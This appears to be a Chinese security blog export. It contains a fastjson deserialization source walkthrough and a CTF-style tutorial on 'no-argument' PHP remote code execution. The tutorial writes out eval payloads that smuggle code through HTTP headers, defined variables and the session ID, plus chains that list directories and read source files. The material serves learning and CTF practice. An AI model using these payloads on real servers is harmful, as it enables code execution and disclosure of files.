<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DefaultJSONParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultJSONParser</span>(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> parser.parse();</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在创建DefaultJSONParser对象时候,会调用重载方法<code>this(input, new JSONScanner(input, features), config);</code></p>
<p>在创建jsonscanner的实例的时候,发现会将我们第一个input的字符放进ch变量里</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"> <span class="built_in">this</span>.text = input;</span><br><span class="line">        <span class="built_in">this</span>.len = <span class="built_in">this</span>.text.length();</span><br><span class="line">        <span class="built_in">this</span>.bp = -<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.next();</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.ch == <span class="string">&#x27;\ufeff&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.next();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">char</span> <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> ++<span class="built_in">this</span>.bp;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.ch = index &gt;= <span class="built_in">this</span>.len ? <span class="string">&#x27;\u001a&#x27;</span> : <span class="built_in">this</span>.text.charAt(index);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">DefaultJSONParser</span><span class="params">(Object input, JSONLexer lexer, ParserConfig config)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.dateFormatPattern = JSON.DEFFAULT_DATE_FORMAT;</span><br><span class="line">    <span class="built_in">this</span>.contextArrayIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.resolveStatus = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">this</span>.extraTypeProviders = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.extraProcessors = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.fieldTypeResolver = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">this</span>.lexer = lexer;</span><br><span class="line">    <span class="built_in">this</span>.input = input;</span><br><span class="line">    <span class="built_in">this</span>.config = config;</span><br><span class="line">    <span class="built_in">this</span>.symbolTable = config.symbolTable;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();</span><br><span class="line">    <span class="keyword">if</span> (ch == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        ((JSONLexerBase)lexer).token = <span class="number">12</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">        lexer.next();</span><br><span class="line">        ((JSONLexerBase)lexer).token = <span class="number">14</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        lexer.nextToken();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现如果ch&#x3D;{就会token等于12,并且将ch的值变成下一个字符</p>
<p>继续跟进parse方法,<code>switch (lexer.token())</code>所以我们这是12,如果是12的话就会</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> LBRACE:</span><br><span class="line">    <span class="type">JSONObject</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>(lexer.isEnabled(Feature.OrderedField));</span><br><span class="line">    <span class="keyword">return</span> parseObject(object, fieldName);</span><br></pre></td></tr></table></figure>

<p>跟进parseobject</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    lexer.skipWhitespace();</span><br><span class="line">    <span class="type">char</span> <span class="variable">ch</span> <span class="operator">=</span> lexer.getCurrent();</span><br><span class="line">    <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">        <span class="keyword">while</span> (ch == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">            lexer.next();</span><br><span class="line">            lexer.skipWhitespace();</span><br><span class="line">            ch = lexer.getCurrent();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>会去除空字符,然后获取ch的值,判断feature是否运行任务逗号,如果有第一个为,的话就获取下一个字符</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">isObjectKey</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"> Object key;</span><br><span class="line"> <span class="keyword">if</span> (ch == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">     key = lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">     lexer.skipWhitespace();</span><br><span class="line">     ch = lexer.getCurrent();</span><br><span class="line">     <span class="keyword">if</span> (ch != <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;expect &#x27;:&#x27; at &quot;</span> + lexer.pos() + <span class="string">&quot;, name &quot;</span> + key);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>如果ch是”的话就会按函数名来看会获取下个”的字符,就是把双引号的东西取出来,取完后判断下个字符是不是：然后到</p>
<p><img src="https://baicany.github.io/images/image-20231124165834921.png" alt="image-20231124165834921"></p>
<p>判断key是否等于<code>@type</code>,等于则获取<code>@type</code>中的值，接着则是调用反射将这个类名传递进去获取一个方法获取类对象。跟进classload</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们存在map里面有这个类的字节码就直接返回,没有就到下一步</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (className.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">          Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">          <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (className.startsWith(<span class="string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="string">&quot;;&quot;</span>)) &#123;</span><br><span class="line">          <span class="type">String</span> <span class="variable">newClassName</span> <span class="operator">=</span> className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">          <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>然后发现 [ 开头的会用数组实例化,而L开头分号结尾的会去除,再加载字节码,而且会存在我们类的字节码到一个map中,就和前面对应了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (classLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">        clazz = classLoader.loadClass(className);</span><br><span class="line">        mappings.put(className, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>中间不难分析,然后继续跟进到</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line"><span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure>

<p>获取我们反序列化器,然后反序列化,调试跟进到第二个deserialze的重载方法，跟到</p>
<p><img src="https://baicany.github.io/images/image-20231124174303755.png" alt="image-20231124174303755"></p>
<p>直接就获取到了autoCommit,但是怎么获取的</p>
<p>是在构造方法被赋值的，也就是实例化对象的时候</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">JavaBeanDeserializer</span><span class="params">(ParserConfig config, JavaBeanInfo beanInfo)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.clazz = beanInfo.clazz;</span><br><span class="line">    <span class="built_in">this</span>.beanInfo = beanInfo;</span><br><span class="line">    </span><br><span class="line">    sortedFieldDeserializers = <span class="keyword">new</span> <span class="title class_">FieldDeserializer</span>[beanInfo.sortedFields.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>, size = beanInfo.sortedFields.length; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="type">FieldInfo</span> <span class="variable">fieldInfo</span> <span class="operator">=</span> beanInfo.sortedFields[i];</span><br><span class="line">        <span class="type">FieldDeserializer</span> <span class="variable">fieldDeserializer</span> <span class="operator">=</span> config.createFieldDeserializer(config, beanInfo, fieldInfo);</span><br><span class="line"></span><br><span class="line">        sortedFieldDeserializers[i] = fieldDeserializer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>看看这里info是什么返回上层，<code>JavaBeanDeserializer</code>是在<code>config.getDeserializer</code>被创建的，跟进一下</p>
<p><img src="https://baicany.github.io/images/image-20231124212940088.png" alt="image-20231124212940088"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="built_in">this</span>.getDeserializer((Class)type, type);</span><br><span class="line">						⬇</span><br><span class="line">derializer = createJavaBeanDeserializer(clazz, type);</span><br><span class="line">						⬇</span><br><span class="line">beanInfo = JavaBeanInfo.build(clazz, type, <span class="built_in">this</span>.propertyNamingStrategy);</span><br><span class="line">						⬇</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在build哪里有一个逻辑就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(method.getReturnType().equals(Void.TYPE) || method.getReturnType().equals(method.getDeclaringClass()))) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line"><span class="keyword">if</span> (types.length != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>判断方法是否是void返回类型,返回类型是否是声明的返回类型,还有参数只有1个才能进入才能进入下面的步骤,下面有个是先判断<code>if (!methodName.startsWith(&quot;set&quot;))</code>然后处理set过后首字母不同的情况<code>Field field = TypeUtils.getField(clazz, propertyName, declaredFields);</code>然后判段这个set方法有没有对应的字段,然后判断是不是布尔类型的,再往后就是判断</p>
<p>中间一段是用注解来添加fileinfo的,再到下一段</p>
<p>又是遍历所有方法,来获取返回值是那5个的get方法,get方法就比set的简陋了</p>
<p><img src="https://baicany.github.io/images/image-20231125225831864.png" alt="image-20231125225831864"></p>
<p>最后就会</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JavaBeanInfo</span>(clazz, builderClass, defaultConstructor, <span class="literal">null</span>, <span class="literal">null</span>, buildMethod, jsonType, fieldList);</span><br></pre></td></tr></table></figure>

<p>然后将我们filedinfo复制到sortedFields中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fields = <span class="keyword">new</span> <span class="title class_">FieldInfo</span>[fieldList.size()];</span><br><span class="line"> fieldList.toArray(fields);</span><br><span class="line"></span><br><span class="line"> FieldInfo[] sortedFields = <span class="keyword">new</span> <span class="title class_">FieldInfo</span>[fields.length];</span><br><span class="line"> System.arraycopy(fields, <span class="number">0</span>, sortedFields, <span class="number">0</span>, fields.length);</span><br><span class="line"> Arrays.sort(sortedFields);</span><br></pre></td></tr></table></figure>

<p>然后回到我们,直接调试到,我们需要的地方就行了</p>
<p><img src="https://baicany.github.io/images/image-20231126210022825.png" alt="image-20231126210022825"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">match</span> <span class="operator">=</span> parseField(parser, key, object, type, fieldValues);</span><br></pre></td></tr></table></figure>

<p>在<code>smartMatch(key);</code>会将 - _替换为空,也在这里找到我们需要的类的信息,因为从0开始遍历我们存储的方法,所以即是一个类既有set又有get也会先调用set</p>
<p>然后到<code>setValue(object, value);</code>如果值不为null,方法存在机会用<code>method.invoke(object, value);</code>反射的方法来调取类的方法</p>
<p><img src="https://baicany.github.io/images/image-20231126221510467.png" alt="image-20231126221510467"></p>
<p>当我们开了SupportNonPublicField,就能反射改这个值了</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">if</span> (<span class="meta">field</span> != null) &#123;</span><br><span class="line">    <span class="meta">field</span><span class="meta">.set</span>(object, value)<span class="comment">;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>学习</strong></p>
<p><a href="https://www.cnblogs.com/nice0e3/p/14601670.html">https://www.cnblogs.com/nice0e3/p/14601670.html</a></p>
<p><a href="https://www.javasec.org/java-vuls/FastJson.html">https://www.javasec.org/java-vuls/FastJson.html</a></p>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>6.24ctf+无参数rce</title>
    <url>/2023/06/24/6.24/</url>
    <content><![CDATA[<h1 id="无参数rce"><a href="#无参数rce" class="headerlink" title="无参数rce"></a>无参数rce</h1><p>什么是无参数？</p>
<p>顾名思义，就是只使用函数，且函数不能带有参数，这里有种种限制：比如我们选择的函数必须能接受其括号内函数的返回值；使用的函数规定必须参数为空或者为一个参数等</p>
<p>一般代码是长这么样的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])&#123;</span><br><span class="line"> 		     <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//或者   preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;code&#x27;])</span></span><br></pre></td></tr></table></figure>

<p><code>(?R)?</code> 是一个递归的子模式。它表示在括号内可以包含另一个完整的模式，从而允许嵌套的函数调用。也就是说，如果在括号内存在类似 <code>func(a(b))</code> 的形式，它会继续递归匹配。</p>
<p><code>^</code> 符号表示取反操作。<code>\w</code> 表示表示匹配任何非字母、非数字和非下划线字符。，而 <code>[^...]</code> 表示匹配除了括号内字符之外的任何字符。因此，<code>[^\W]</code> 实际上是匹配除了字母、数字和下划线之外的字符。</p>
<p><code>(?R)?</code>能匹配的只有<code>a(); a(b()); a(b(c()));</code>这种类型的。比如传入<code>a(b(c()));</code>，第一次匹配后，就剩<code>a(b());</code>，第二次匹配后，<code>a();</code>，第三次匹配后就只剩下<code>;</code>了，最后<code>a(b(c()));</code>就会被eval执行。</p>
<p>ps:感觉这种题纯拷打代码量了</p>
<h2 id="使用的函数"><a href="#使用的函数" class="headerlink" title="使用的函数"></a>使用的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">getchwd</span>() 函数返回当前工作目录。</span><br><span class="line"><span class="title function_ invoke__">scandir</span>() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line"><span class="title function_ invoke__">dirname</span>() 函数返回路径中的目录部分。</span><br><span class="line"><span class="title function_ invoke__">chdir</span>() 函数改变当前的目录。</span><br><span class="line"><span class="title function_ invoke__">readfile</span>() 输出一个文件。</span><br><span class="line"><span class="title function_ invoke__">current</span>() 返回数组中的当前单元, 默认取第一个值。</span><br><span class="line"><span class="title function_ invoke__">pos</span>() 	 <span class="comment">//current() 的别名。</span></span><br><span class="line"><span class="title function_ invoke__">next</span>() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line"><span class="title function_ invoke__">end</span>() 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line"><span class="title function_ invoke__">array_rand</span>() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line"><span class="title function_ invoke__">array_flip</span>() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br><span class="line"><span class="title function_ invoke__">array_slice</span>() 函数在数组中根据条件取出一段值，并返回。</span><br><span class="line"><span class="title function_ invoke__">array_reverse</span>() 函数返回翻转顺序的数组。</span><br><span class="line"><span class="title function_ invoke__">chr</span>() 函数从指定的 ASCII 值返回字符。</span><br><span class="line"><span class="title function_ invoke__">hex2bin</span>() — 转换十六进制字符串为二进制字符串。</span><br><span class="line"><span class="title function_ invoke__">getenv</span>() 获取一个环境变量的值(在<span class="number">7.1</span>之后可以不给予参数)。</span><br><span class="line"><span class="title function_ invoke__">localeconv</span>() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"><span class="title function_ invoke__">ord</span>()返回字符串中第一个字符的Ascii值</span><br><span class="line"><span class="title function_ invoke__">crypt</span>()返回使用 DES、Blowfish 或 MD5 算法加密的字符串</span><br><span class="line"><span class="title function_ invoke__">hebrevc</span>() 函数是一个用于反转希伯来文（Hebrew）文本的函数。在希伯来文中，文字是从右往左书写的，而大部分其他语言都是从左往右书写。所以，为了在处理希伯来文文本时显示正确的字符顺序，需要使用 hebrevc 函数来将文本进行反转。</span><br></pre></td></tr></table></figure>

<h2 id="常见命令执行rce"><a href="#常见命令执行rce" class="headerlink" title="常见命令执行rce"></a>常见命令执行rce</h2><ol>
<li>getallheaders()&amp;apache_request_headers()<br><img src="https://baicany.github.io/images/f0.png" alt="在这里插入图片描述"></li>
</ol>
<p><code>getallheaders()</code>返回所有的HTTP头信息，但是要注意的一点是这个函数返回的是一个数组，而eval()要求的参数是一个字符串，所以这里不能直接用，这时我们就要想办法将数组转换为字符串。正好<code>implode()</code>这个函数就能胜任。</p>
<p><img src="https://baicany.github.io/images/1a.png" alt="在这里插入图片描述"></p>
<p><code>implode()</code>能够直接将<code>getallheaders()</code>返回的数组转化为字符串。</p>
<p>本地测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">getallheaders</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://baicany.github.io/images/image-20230624224459225.png" alt="image-20230624224459225"></p>
<p>可以看到获取到的头信息被当作字符串输出了，且是从最后开始输出(由于php版本不同，输出顺序也可能不同)，那么我们就可以在最后随意添加一个头，插入我们的恶意代码并将后面的内容注释掉。</p>
<p>创一个本地文件测试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://baicany.github.io/images/image-20230624225936528.png" alt="image-20230624225936528"></p>
<p>这里要eval的原因是要把返回的字符串当代码执行了</p>
<ol start="2">
<li>get_defined_vars()&amp;getenv()</li>
</ol>
<p><img src="https://baicany.github.io/images/f2.png" alt="在这里插入图片描述"></p>
<p>该函数的作用是获取所有的已定义变量，返回值也是数组。不过这个函数返回的是一个二维数组，所以不能与<code>implode</code>结合起来用。将<code>get_defined_vars()</code>的结果用<code>var_dump()</code>输出结果如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">get_defined_vars</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://baicany.github.io/images/f3.png" alt="在这里插入图片描述"></p>
<p>可以看到用GET传入的参数会被显示在数组中的第一位：</p>
<p>不过这里有这么多的数组，我们也不需要全部查看是吧？那么使用<code>current()</code>函数就可以办成这个事情:</p>
<p>函数可以返回数组中的单元且初始指针指向数组的第一个单元。因为GET方式传入的参数存在该二维数组中的第一个一维数组（也就是上图array(7)中的第一个数组[“_GET”]&#x3D;&gt; array(1) { [“get”]&#x3D;&gt; string(1) “a” }），所以我们可以通过这个函数将其取出来</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">cuurent</span>(<span class="title function_ invoke__">get_defined_vars</span>()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从图中能看出后面传入的<code>shell=phpinfo();</code>出现在了第一个数组的最后。</p>
<p><img src="https://img-blog.csdnimg.cn/5ddf4d29b71d4cfa8b69ff0c45795440.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBATDFhbTB1cg==,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p>回忆一下之前的payload：?exp&#x3D;eval(implode(getallheaders()));，设想下：current()是取出二维数组中的第一个（指针指向的那个）一维数组，用end()就可以取出这个一维数组中的最后那个值，加上之前的payload你能想到什么？<br>新payload：?exp&#x3D;eval(end(current(get_defined_vars())));&amp;shell&#x3D;phpinfo();<br>用这个payload的话就可以执行shell的命令了</p>
<ol start="3">
<li>session_id()</li>
</ol>
<p><img src="https://baicany.github.io/images/f4.png" alt="在这里插入图片描述"></p>
<p>官方说：<code>session_id()</code>可以用来获取&#x2F;设置当前会话 ID。<br>那么可以用这个函数来获取cookie中的<code>phpsessionid</code>了，并且这个值我们是可控的。<br>但其有限制：<strong>文件会话管理器仅允许会话 ID 中使用以下字符：a-z A-Z 0-9 ,（逗号）和 - （减号）</strong></p>
<p>传不了括号he引号怎么办</p>
<p>解决方法：将参数转化为16进制传进去，之后再用hex2bin()函数转换回来就可以了</p>
<p><img src="https://baicany.github.io/images/f8.png" alt="在这里插入图片描述"></p>
<p>所以，payload可以为：?exp&#x3D;eval(hex2bin(session_id()));<br>但session_id必须要开启session才可以使用，所以我们要先使用session_start。<br>最后，payload：?exp&#x3D;eval(hex2bin(session_id(session_start())));<br>说到这里，这套组合拳还差了点东西，你还没写你要执行的代码！<br>不是才说道session_id()可以获取cookie中的phpsessionid，并且这个值我们是可控的吗？所以我们可以在http头中设置PHPSESSID为想要执行代码的16进制：hex(“phpinfo();”)&#x3D;706870696e666f28293b</p>
<h2 id="读文件rce"><a href="#读文件rce" class="headerlink" title="读文件rce"></a>读文件rce</h2><h3 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h3><p>正常的，print_r(scandir(‘.’));可以用来查看当前目录所有文件名</p>
<p>但是要怎么构造参数里这个点呢</p>
<ol>
<li><strong>localeconv()</strong></li>
</ol>
<p>localeconv()返回一包含本地数字及货币格式信息的数组。而数组第一项就是”.”（后续出现的.都用双引号包裹，方便识别）</p>
<p><img src="https://image.3001.net/images/20220317/1647485327_6232a18fb8e45a26bbd4d.png!small" alt="1647485327_6232a18fb8e45a26bbd4d.png!small"></p>
<p>怎么提取点呢</p>
<p><img src="https://image.3001.net/images/20220317/1647485335_6232a1972fc186952c3e9.png!small" alt="1647485335_6232a1972fc186952c3e9.png!small"></p>
<p>利用current，current(localeconv()) 就能获取点</p>
<p>print_r(scandir(current(localeconv()))); 就能打印出当前目录下文件：</p>
<p>或者print_r(scandir(pos(localeconv())));</p>
<p>如果都被过滤还可以使用reset()，该函数返回数组第一个单元的值，如果数组为空则返回 FALSE</p>
<p>再不行就只有靠运气了</p>
<p>chr(46)就是字符”.”要构造46，有几个方法：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">chr</span>()函数以<span class="number">256</span>为一个周期，所以<span class="title function_ invoke__">chr</span>(<span class="number">46</span>),<span class="title function_ invoke__">chr</span>(<span class="number">302</span>),<span class="title function_ invoke__">chr</span>(<span class="number">558</span>)都等于<span class="string">&quot;.&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>()) (不实际，看运气)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">time</span>())</span><br><span class="line">所以使用<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">time</span>())，一个周期必定出现一次<span class="string">&quot;.&quot;</span></span><br><span class="line">数组第一个值每秒+<span class="number">1</span>，所以最多<span class="number">60</span>秒就一定能得到<span class="number">46</span>，用<span class="title function_ invoke__">current</span>()就能获得<span class="string">&quot;.&quot;</span>    </span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localtime</span>(<span class="title function_ invoke__">time</span>())))</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>phpversion()</li>
</ol>
<ul>
<li><code>phpversion()</code>返回php版本，如<code>7.3.5</code></li>
<li><code>floor(phpversion())</code>返回<code>7</code></li>
<li><code>sqrt(floor(phpversion()))</code>返回<code>2.6457513110646</code></li>
<li><code>tan(floor(sqrt(floor(phpversion()))))</code>返回<code>-2.1850398632615</code></li>
<li><code>cosh(tan(floor(sqrt(floor(phpversion())))))</code>返回<code>4.5017381103491</code></li>
<li><code>sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))</code>返回<code>45.081318677156</code></li>
<li><code>ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))</code>返回<code>46</code></li>
<li><code>chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))</code>返回<code>.</code></li>
<li><code>var_dump(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>扫描当前目录</li>
<li><code>next(scandir(chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))))</code>返回<code>..</code></li>
</ul>
<p>hebrevc(crypt(arg))可以随机生成一个hash值，第一个字符随机是$(大概率) 或者 “.”(小概率) 然后通过chr(ord())只取第一个字符</p>
<p>print_r(scandir(chr(ord(hebrevc(crypt(time()))))));来扫目录</p>
<p>同理：strrev(crypt(serialize(array())))也可以得到”.”，只不过crypt(serialize(array()))的点出现在最后一个字符，需要使用strrev()逆序，然后使用chr(ord())获取第一个字符</p>
<p>获取绝对路径可用的有getcwd()和realpath(‘.’)</p>
<p>所以我们还可以用print_r(scandir(getcwd()));输出当前文件夹所有文件名</p>
<h3 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h3><p>通过前面的方法输出了当前目录文件名，如果文件不能直接显示，比如PHP源码，我们还需要使用函数读取：</p>
<p>前面的方法输出的是数组，文件名是数组的值，那我们要怎么取出想要读取文件的数组呢：</p>
<p>show_source(end(scandir(getcwd())));或者用readfile、highlight_file、file_get_contents 等读文件函数都可以（使用readfile和file_get_contents读文件，显示在源码处）</p>
<p>通过array_reverse() 以相反的元素顺序返回数组</p>
<p>show_source(current(array_reverse(scandir(getcwd()))));</p>
<p>如果是倒数第二个我们可以用：</p>
<p>show_source(next(array_reverse(scandir(getcwd()))));</p>
<p>如果不是数组的最后一个或者倒数第二个呢？</p>
<p>我们可以使用array_rand(array_flip())，array_flip()是交换数组的键和值，array_rand()是随机返回一个数组的键名</p>
<p>show_source(array_rand(array_flip(scandir(getcwd()))));</p>
<p>show_source(array_rand(array_flip(scandir(current(localeconv())))));</p>
<h3 id="查看上一级目录名"><a href="#查看上一级目录名" class="headerlink" title="查看上一级目录名"></a>查看上一级目录名</h3><p>dirname() ：返回路径中的目录部分,如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径</p>
<ol>
<li>dirname()方法</li>
</ol>
